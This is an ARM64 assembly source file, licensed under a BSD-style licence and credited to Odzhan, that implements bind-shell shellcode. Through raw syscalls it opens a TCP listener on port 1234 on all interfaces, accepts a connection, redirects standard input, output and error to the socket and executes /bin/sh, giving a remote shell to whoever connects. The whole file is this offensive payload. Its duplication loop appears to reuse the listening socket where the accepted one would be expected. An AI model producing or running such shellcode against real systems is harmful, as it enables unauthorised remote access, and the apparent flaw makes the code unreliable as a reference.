 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
    .arch armv8-a
    .align 4

    .include "include.inc"

    .global _start
    .text

_start:
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    mov     x8, #SYS_socket
    mov     x2, #IPPROTO_IP
    mov     x1, #SOCK_STREAM
    mov     x0, #AF_INET
    svc     0
    
    mov     w6, w0       // w6 = s
    
    // bind(s, &sa, sizeof(sa));  
    mov     x8, #SYS_bind
    mov     x2, #16
    adr     x1, sa
    svc     0
  
    // listen(s, 1);
    mov     x8, #SYS_listen
    mov     x1, #1
    mov     w0, w6
    svc     0    
    
    // r = accept(s, 0, 0);
    mov     x8, #SYS_accept
    mov     x2, xzr
    mov     x1, xzr
    mov     w0, w6
    svc     0    
    
    // in this order
    //
    // dup3(s, FILENO_STDERR, 0);
    // dup3(s, FILENO_STDOUT, 0);
    // dup3(s, FILENO_STDIN,  0);
    mov     x8, #SYS_dup3
    mov     x1, #STDERR_FILENO
c_dup:
    mov     x2, xzr
    mov     w0, w6
    svc     0
    subs    x1, x1, #1
    bpl     c_dup

    // execve("/bin/sh", NULL, NULL);
    mov     x8, #SYS_execve
    mov     x1, xzr
    adr     x0, sh
    svc     0
sh:
    .asciz  "/bin/sh"
sa:
    .hword  0x0002     // sa.sin_family = AF_INET
    .hword  0xd204     // sa.sin_port   = htons("1234")
    .word   0x00000000 // sa.sin_addr   = INADDR_ANY

